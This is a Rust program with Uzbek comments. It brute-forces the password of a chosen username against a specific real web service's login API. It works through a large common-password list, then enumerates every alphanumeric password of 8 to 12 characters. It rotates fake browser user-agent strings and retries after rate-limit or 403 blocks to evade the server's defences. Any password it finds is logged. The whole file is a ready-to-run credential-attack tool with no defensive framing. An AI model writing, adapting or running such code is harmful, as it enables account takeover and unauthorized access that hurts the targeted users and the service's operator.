use rand::seq::SliceRandom;
use rand::thread_rng;
use reqwest::Client;
use serde_json::Value;
use std::error::Error;
use std::fs::{self, File};
use std::io::{self, Write};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::time::sleep;

// Fake device nomlari ro'yxati (kengaytirilgan)
const FAKE_DEVICES: &[&str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 15_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Linux; Android 12; SM-S906N) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
];

// Mashhur parollar ro'yxati (kengaytirilgan)
const COMMON_PASSWORDS: &[&str] = &[
    // Eng ko'p ishlatiladigan parollar
    "123456",
    "123456789",
    "12345",
    "qwerty",
    "password",
    "12345678",
    "111111",
    "123123",
    "1234567890",
    "1234567",
    "qwerty123",
    "000000",
    "1q2w3e",
    "aa123456",
    "abc123",
    "password1",
    "1234",
    "qwertyuiop",
    "123321",
    "password123",
    // Sodda raqamli kombinatsiyalar
    "112233",
    "121212",
    "123123",
    "123456",
    "123654",
    "131313",
    "159753",
    "222222",
    "333333",
    "444444",
    "555555",
    "666666",
    "696969",
    "777777",
    "789456",
    "987654",
    "999999",
    // Harfli parollar
    "admin",
    "administrator",
    "login",
    "pass",
    "passw0rd",
    "master",
    "hello",
    "letmein",
    "welcome",
    "monkey",
    "dragon",
    "baseball",
    "football",
    "superman",
    "qazwsx",
    "password",
    "access",
    "shadow",
    "trustno1",
    "jesus",
    "jordan",
    "michael",
    "michelle",
    "andrew",
    "charlie",
    // Mashhur so'zlar va ismlar
    "ashley",
    "jennifer",
    "thomas",
    "computer",
    "internet",
    "sunshine",
    "iloveyou",
    "freedom",
    "whatever",
    "hello",
    "samsung",
    "apple",
    "google",
    "microsoft",
    "photoshop",
    "password1",
    "password123",
    "welcome123",
    "login123",
    "admin123",
    "letmein123",
    // Qisqa parollar
    "123",
    "1234",
    "12345",
    "123456",
    "1234567",
    "12345678",
    "123456789",
    "1234567890",
    "qwe",
    "qwer",
    "qwert",
    "qwerty",
    "qwertyu",
    "qwertyui",
    "qwertyuiop",
    "asd",
    "asdf",
    "asdfg",
    "asdfgh",
    "asdfghj",
    "asdfghjk",
    "asdfghjkl",
    "zxcv",
    "zxcvb",
    "zxcvbn",
    "zxcvbnm",
    // Klaviatura patternlari
    "1qaz",
    "2wsx",
    "3edc",
    "4rfv",
    "5tgb",
    "6yhn",
    "7ujm",
    "8ik,",
    "9ol.",
    "0p;/",
    "qwert",
    "asdfg",
    "zxcvb",
    "poiuyt",
    "lkjhg",
    "mnbvc",
    "!qaz",
    "@wsx",
    "#edc",
    "$rfv",
    "%tgb",
    "^yhn",
    "&ujm",
    "*ik,",
    "(ol.",
    ")p;/",
    // Mashhur parol variantlari
    "adminadmin",
    "superadmin",
    "root",
    "toor",
    "guest",
    "user",
    "default",
    "unknown",
    "test",
    "test123",
    "demo",
    "demo123",
    "temp",
    "temp123",
    "backup",
    "backup123",
    "welcome1",
    "welcome123",
    "login1",
    "login123",
    "pass123",
    "passw0rd",
    "password1",
    "password12",
    "password123",
    "password1234",
    "letmein1",
    "letmein123",
    // Mashhur ismlar va so'zlar
    "alex",
    "alexander",
    "anna",
    "buster",
    "charlie",
    "daniel",
    "david",
    "diamond",
    "ginger",
    "hannah",
    "harley",
    "heather",
    "jessica",
    "joshua",
    "justin",
    "matthew",
    "mustang",
    "nicole",
    "password",
    "patrick",
    "robert",
    "samsung",
    "summer",
    "superman",
    "thomas",
    "thunder",
    "tigger",
    "william",
    "yamaha",
    "zxcvbnm",
    // Mashhur parollar turli tillarda
    "пароль",
    "contraseña",
    "senha",
    "passwort",
    "wachtwoord",
    "heslo",
    "lösenord",
    "salasana",
    "passord",
    "hasło",
    "lozinka",
    "密码",
    "パスワード",
    "암호",
    // Mashhur parollar turli tizimlar uchun
    "raspberry",
    "arduino",
    "root123",
    "admin1234",
    "administrator1",
    "guest123",
    "user123",
    "test1234",
    "demo1234",
    "temp1234",
    "backup1234",
    // Qo'shimcha mashhur parollar
    "123qwe",
    "123abc",
    "abc123",
    "qwe123",
    "asd123",
    "zxc123",
    "qazwsx",
    "1q2w3e4r",
    "1q2w3e4r5t",
    "1qaz2wsx",
    "zaq12wsx",
    "!qaz2wsx",
    "1qaz@wsx",
    "1qazxsw2",
    "qwerty1",
    "qwerty12",
    "qwerty123",
    "qwerty1234",
    "asdfgh1",
    "asdfgh12",
    "asdfgh123",
    "asdfgh1234",
    "zxcvbn1",
    "zxcvbn12",
    "zxcvbn123",
    "zxcvbn1234",
    // Yana mashhur parollar
    "monkey123",
    "dragon123",
    "baseball123",
    "football123",
    "superman123",
    "iloveyou123",
    "sunshine123",
    "freedom123",
    "whatever123",
    "hello123",
    "jesus123",
    "jordan123",
    "michael123",
    "michelle123",
    "andrew123",
    "charlie123",
    "ashley123",
    "jennifer123",
    "thomas123",
    "computer123",
    "internet123",
    // Parollar turli formatlarda
    "pass1234",
    "password01",
    "password02",
    "password03",
    "password2020",
    "password2021",
    "password2022",
    "password2023",
    "welcome01",
    "welcome02",
    "welcome03",
    "login01",
    "login02",
    "login03",
    "admin01",
    "admin02",
    "admin03",
    "user01",
    "user02",
    "user03",
    "test01",
    "test02",
    "test03",
    "demo01",
    "demo02",
    "demo03",
    // Raqamli parollar
    "00000000",
    "11111111",
    "22222222",
    "33333333",
    "44444444",
    "55555555",
    "66666666",
    "77777777",
    "88888888",
    "99999999",
    "01234567",
    "12345678",
    "23456789",
    "34567890",
    "45678901",
    "56789012",
    "67890123",
    "78901234",
    "89012345",
    "90123456",
    // Karomchi pattern parollar
    "159357",
    "357159",
    "753951",
    "951753",
    "258456",
    "456258",
    "852654",
    "654852",
    "147258",
    "258369",
    "369258",
    "258147",
    "963852",
    "852963",
    "741852",
    "852741",
    // Klaviaturadagi yaqin tugmalar
    "qwert",
    "asdfg",
    "zxcvb",
    "yuiop",
    "hjkl",
    "vbnm",
    "poiu",
    "lkjh",
    "mnbv",
    "rewq",
    "fdsa",
    "vcxz",
    "oiuy",
    "hjk",
    "nbv",
    "qweasd",
    "asdzxc",
    "zxcasd",
    "qazxsw",
    "wsxcde",
    "edcvfr",
    "rfvtgb",
    "tgbyhn",
    "yhnujm",
    "ujmik",
    "ik,ol",
    "ol.p;",
    "p;[/",
    "[/]'",
    // Mashhur parollar turli mamlakatlarda
    "password",
    "123456",
    "123456789",
    "12345678",
    "12345",
    "111111",
    "1234567",
    "sunshine",
    "qwerty",
    "iloveyou",
    "princess",
    "admin",
    "welcome",
    "666666",
    "abc123",
    "football",
    "123123",
    "monkey",
    "654321",
    "superman",
    "1qaz2wsx",
    "baseball",
    "master",
    "hello",
    "letmein",
    "trustno1",
    "dragon",
    "passw0rd",
    "qwertyuiop",
    "mustang",
    "access",
    "shadow",
    "michael",
    "jordan",
    "harley",
    "1234567890",
    "123qwe",
    "welcome123",
    // Yana qo'shimcha mashhur parollar
    "adminadmin",
    "password1",
    "password123",
    "qwerty123",
    "letmein123",
    "welcome123",
    "login123",
    "admin123",
    "test123",
    "temp123",
    "demo123",
    "backup123",
    "root123",
    "guest123",
    "user123",
    "pass123",
    "1234abcd",
    "abcd1234",
    "qwer1234",
    "1234qwer",
    "asdf1234",
    "1234asdf",
    "zxcv1234",
    "1234zxcv",
    "1q2w3e4r",
    "q1w2e3r4",
    "1a2s3d4f",
    "a1s2d3f4",
    "1z2x3c4v",
    "z1x2c3v4",
    // Eng xavfli parollar
    "000000",
    "111111",
    "112233",
    "121212",
    "123123",
    "123456",
    "123456789",
    "1234567890",
    "1234567",
    "12345678",
    "1234",
    "12345",
    "654321",
    "666666",
    "696969",
    "7777777",
    "987654",
    "987654321",
    "999999",
    "aaaaaa",
    "abc123",
    "admin",
    "password",
    "password1",
    "password123",
    "qwerty",
    "qwerty123",
    "qwertyuiop",
    "superman",
    "welcome",
    // Yana qo'shimcha
    "administrator",
    "root",
    "toor",
    "guest",
    "user",
    "default",
    "test",
    "demo",
    "temp",
    "backup",
    "unknown",
    "secret",
    "private",
    "public",
    "system",
    "server",
    "client",
    "info",
    "data",
    "database",
    "network",
    "security",
    "access",
    "login",
    "logout",
    "config",
    "setup",
    "install",
    "update",
    "upgrade",
    "back",
    "restore",
    "recovery",
    // Mashhur parollar 2020-2023
    "password2020",
    "password2021",
    "password2022",
    "password2023",
    "welcome2020",
    "welcome2021",
    "welcome2022",
    "welcome2023",
    "admin2020",
    "admin2021",
    "admin2022",
    "admin2023",
    "test2020",
    "test2021",
    "test2022",
    "test2023",
    "demo2020",
    "demo2021",
    "demo2022",
    "demo2023",
    "temp2020",
    "temp2021",
    "temp2022",
    "temp2023",
    // So'nggi yillarda mashhur bo'lgan parollar
    "corona",
    "covid19",
    "covid2020",
    "covid2021",
    "covid2022",
    "covid2023",
    "virus",
    "vaccine",
    "mask",
    "quarantine",
    "lockdown",
    "socialdistancing",
    "pandemic",
    "epidemic",
    "infection",
    "health",
    "wellness",
    "sanitizer",
    "disinfectant",
    // Mashhur parollar turli sohalarda
    "instagram",
    "facebook",
    "twitter",
    "whatsapp",
    "telegram",
    "snapchat",
    "tiktok",
    "youtube",
    "google",
    "gmail",
    "yahoo",
    "hotmail",
    "outlook",
    "microsoft",
    "apple",
    "amazon",
    "netflix",
    "spotify",
    "discord",
    "zoom",
    "skype",
    "linkedin",
    "pinterest",
    // Parollar turli formatlarda
    "pass123!",
    "password!",
    "welcome!",
    "admin!",
    "test!",
    "demo!",
    "temp!",
    "backup!",
    "root!",
    "guest!",
    "user!",
    "123456!",
    "qwerty!",
    "letmein!",
    "iloveyou!",
    "sunshine!",
    "football!",
    "baseball!",
    "superman!",
    "monkey!",
    "dragon!",
    "master!",
    "hello!",
    "jesus!",
    "jordan!",
    "michael!",
    "michelle!",
    "andrew!",
    "charlie!",
    "ashley!",
    "jennifer!",
    "thomas!",
    "computer!",
    "internet!",
];

// Log faylini yaratish va yozish uchun funksiya
fn log_message(log_file: &Arc<Mutex<File>>, message: &str, console_print: bool) {
    let mut file = log_file.lock().unwrap();
    writeln!(*file, "{}", message).expect("Log fayliga yozishda xato");
    if console_print {
        println!("{}", message);
    }
}

// Log faylini yaratish
fn create_log_file() -> Result<File, Box<dyn Error>> {
    let filename = "password_finder.log";
    let file = File::create(filename)?;
    Ok(file)
}

// Eski log fayllarni o'chirish
fn cleanup_old_logs() -> Result<(), Box<dyn Error>> {
    let filename = "password_finder.log";
    if std::path::Path::new(filename).exists() {
        fs::remove_file(filename)?;
        println!("Eski log fayl o'chirildi: {}", filename);
    }
    Ok(())
}

// Parol generatori - avval mashhur parollardan boshlaydi
struct PasswordGenerator {
    common_passwords: Vec<String>,
    current_common_index: usize,
    charset: Vec<char>,
    current_length: usize,
    current_indices: Vec<usize>,
    used_passwords: std::collections::HashSet<String>,
}

impl PasswordGenerator {
    fn new() -> Self {
        let mut common_passwords: Vec<String> =
            COMMON_PASSWORDS.iter().map(|s| s.to_string()).collect();
        common_passwords.shuffle(&mut thread_rng());

        PasswordGenerator {
            common_passwords,
            current_common_index: 0,
            charset: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
                .chars()
                .collect(),
            current_length: 8,
            current_indices: vec![0; 8],
            used_passwords: std::collections::HashSet::new(),
        }
    }

    fn next(&mut self) -> Option<String> {
        // Avval mashhur parollarni qaytaradi
        if self.current_common_index < self.common_passwords.len() {
            let password = self.common_passwords[self.current_common_index].clone();
            self.current_common_index += 1;

            if !self.used_passwords.contains(&password) {
                self.used_passwords.insert(password.clone());
                return Some(password);
            }
        }

        // Keyin boshqa parollarni generatsiya qiladi
        loop {
            // Kombinatsiyani generatsiya qilish
            let password: String = self
                .current_indices
                .iter()
                .map(|&i| self.charset[i])
                .collect();

            // Keyingi kombinatsiyaga o'tish
            let mut i = self.current_length - 1;
            loop {
                self.current_indices[i] += 1;
                if self.current_indices[i] < self.charset.len() {
                    break;
                }
                self.current_indices[i] = 0;
                if i == 0 {
                    break;
                }
                i -= 1;
            }

            // Agar barcha kombinatsiyalar tugagan bo'lsa, keyingi uzunlikka o'tish
            if self.current_indices.iter().all(|&x| x == 0) {
                self.current_length += 1;
                if self.current_length > 12 {
                    return None; // Barcha uzunliklar tugadi
                }
                self.current_indices = vec![0; self.current_length];
                continue;
            }

            // Parol avval ishlatilmaganligini tekshirish
            if !self.used_passwords.contains(&password) {
                self.used_passwords.insert(password.clone());
                return Some(password);
            }
        }
    }

    fn set_start_password(&mut self, start_password: &str) {
        // Berilgan paroldan keyingi parollarni generatsiya qilish uchun holatni o'rnatish
        self.used_passwords.insert(start_password.to_string());

        // Parol uzunligini o'rnatish
        self.current_length = start_password.len();
        self.current_indices = vec![0; self.current_length];

        // Parolni indekslarga aylantirish
        for (i, c) in start_password.chars().enumerate() {
            if let Some(pos) = self.charset.iter().position(|&x| x == c) {
                self.current_indices[i] = pos;
            }
        }

        // Keyingi parolga o'tish
        let mut i = self.current_length - 1;
        loop {
            self.current_indices[i] += 1;
            if self.current_indices[i] < self.charset.len() {
                break;
            }
            self.current_indices[i] = 0;
            if i == 0 {
                break;
            }
            i -= 1;
        }
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    // Eski log fayllarni tozalash
    cleanup_old_logs()?;

    println!("Dastur ishga tushdi");

    // Davom etish yoki boshidan boshlashni so'rash
    println!("Boshidan boshlaymizmi yoki davom ettiramizmi? (b/d):");
    let mut choice = String::new();
    io::stdin().read_line(&mut choice)?;
    let choice = choice.trim();

    let mut start_password = None;
    if choice.eq_ignore_ascii_case("d") {
        println!("Oxirgi urinishdagi parolni kiriting:");
        let mut password = String::new();
        io::stdin().read_line(&mut password)?;
        start_password = Some(password.trim().to_string());
    }

    // Foydalanuvchi nomini olish
    println!("Foydalanuvchi nomini kiriting:");
    let mut username = String::new();
    io::stdin().read_line(&mut username)?;
    let username = username.trim().to_string();

    // Foydalanuvchi nomi @ bilan boshlanishini tekshirish
    let username = if !username.starts_with('@') {
        format!("@{}", username)
    } else {
        username
    };

    // Foydalanuvchi nomi uzunligini tekshirish
    if username.len() < 6 || username.len() > 15 {
        println!("Xato: Foydalanuvchi nomi 6 dan 15 belgigacha bo'lishi kerak va @ bilan boshlanishi kerak. Siz kiritgan: {}", username);
        return Ok(());
    }

    println!("{} uchun parolni topish boshlandi...", username);

    // HTTP klientini yaratish
    let client = Client::builder().timeout(Duration::from_secs(10)).build()?;

    // O'zgaruvchilarni yaratish
    let found = Arc::new(Mutex::new(false));
    let blocked = Arc::new(Mutex::new(false));
    let user_not_found = Arc::new(Mutex::new(false));
    let tried_counter = Arc::new(Mutex::new(0));

    // Log faylini yaratish
    let log_file = Arc::new(Mutex::new(create_log_file()?));
    log_message(
        &log_file,
        &format!("Dastur ishga tushdi. Foydalanuvchi: {}", username),
        true,
    );

    // Parol generatorini yaratish
    let mut password_generator = PasswordGenerator::new();

    // Agar davom etish tanlangan bo'lsa, generatorni sozlash
    if let Some(start_pwd) = start_password {
        password_generator.set_start_password(&start_pwd);
        log_message(
            &log_file,
            &format!("Davom etish: '{}' parolidan keyin", start_pwd),
            true,
        );
    }

    // Asosiy tsikl
    while let Some(password) = password_generator.next() {
        if *found.lock().unwrap() || *blocked.lock().unwrap() || *user_not_found.lock().unwrap() {
            break;
        }

        // Urinishlar sonini oshirish
        let mut tried = tried_counter.lock().unwrap();
        *tried += 1;
        let current_try = *tried;

        // Har 100 urinishda progress haqida xabar berish
        if current_try % 100 == 0 {
            println!(
                "{} ta parol sinandi. Hozirgi parol: {}",
                current_try, password
            );
        }

        // Random device name tanlash
        let device = FAKE_DEVICES
            .choose(&mut thread_rng())
            .unwrap_or(&FAKE_DEVICES[0]);

        // API ga so'rov yuborish
        let payload = serde_json::json!({
            "device": device,
            "loginInput": username,
            "password": password
        });

        let response = client
            .post("https://geektv-backend.onrender.com/api/login")
            .json(&payload)
            .send()
            .await;

        match response {
            Ok(resp) => {
                let status = resp.status();
                let response_text = resp
                    .text()
                    .await
                    .unwrap_or_else(|_| "Javob matnini o'qib bo'lmadi".to_string());

                // Response ni JSON formatida parse qilish
                let json_response: Result<Value, _> = serde_json::from_str(&response_text);

                if status.is_success() {
                    let message = format!(
                        "PAROL TOPILDI! Urinish {}: Foydalanuvchi: {} | Parol: {} | Response: {}",
                        current_try, username, password, response_text
                    );
                    log_message(&log_file, &message, true);
                    *found.lock().unwrap() = true;
                    break;
                } else if status == 400 {
                    // Foydalanuvchi topilmadi xabarini tekshirish
                    if let Ok(json) = json_response {
                        if let Some(message) = json.get("message") {
                            if message == "Foydalanuvchi topilmadi" {
                                let log_msg = format!("FOYDALANUVCHI TOPILMADI! Urinish {}: Foydalanuvchi: {} | Response: {}", 
                                                     current_try, username, response_text);
                                log_message(&log_file, &log_msg, true);
                                println!("Foydalanuvchi topilmadi. Dastur to'xtatildi.");
                                *user_not_found.lock().unwrap() = true;
                                break;
                            }
                        }
                    }
                    // Boshqa 400 xatolari uchun log yozmaymiz
                } else if status == 429 || status == 403 {
                    // Server bloklagan (Too Many Requests yoki Forbidden)
                    let message = format!(
                        "SERVER BLOKLADI! Urinish {}: Status: {} | Device: {} | Response: {}",
                        current_try, status, device, response_text
                    );
                    log_message(&log_file, &message, true);
                    println!(
                        "Server blokladi! Status: {}. 1 daqiqa kutamiz va device ni o'zgartiramiz.",
                        status
                    );

                    // 1 daqiqa kutish
                    sleep(Duration::from_secs(60)).await;

                    // Device nomini o'zgartirish
                    log_message(
                        &log_file,
                        "Device nomi o'zgartirildi, qayta urinish.",
                        false,
                    );
                    continue;
                }
                // Boshqa xatoliklar uchun log yozmaymiz
            }
            Err(e) => {
                // Tarmoq xatolari yoki timeout
                if e.is_timeout() || e.is_connect() {
                    let message = format!(
                        "NETWORK XATOSI! Urinish {}: Xatolik: {} | Device: {}",
                        current_try, e, device
                    );
                    log_message(&log_file, &message, true);
                    println!(
                        "Tarmoq xatosi: {}. 1 daqiqa kutamiz va device ni o'zgartiramiz.",
                        e
                    );

                    // 1 daqiqa kutish
                    sleep(Duration::from_secs(60)).await;

                    // Device nomini o'zgartirish
                    log_message(
                        &log_file,
                        "Device nomi o'zgartirildi, qayta urinish.",
                        false,
                    );
                    continue;
                }
                // Boshqa xatoliklar uchun log yozmaymiz
            }
        }

        // Serverga ortiqcha yuk bo'lmasligi uchun kichik tanaffus
        sleep(Duration::from_millis(50)).await;
    }

    if *found.lock().unwrap() {
        log_message(
            &log_file,
            "Dastur muvaffaqiyatli yakunlandi - parol topildi!",
            true,
        );
    } else if *user_not_found.lock().unwrap() {
        log_message(
            &log_file,
            "Dastur to'xtatildi - foydalanuvchi topilmadi!",
            true,
        );
    } else if *blocked.lock().unwrap() {
        log_message(
            &log_file,
            "Dastur server tomonidan bloklanganligi sababli to'xtatildi!",
            true,
        );
    } else {
        log_message(&log_file, "Parol topilmadi. Boshqa uzunlikdagi parollarni sinab ko'ring yoki boshqa foydalanuvchi nomini ishlating.", true);
    }

    Ok(())
}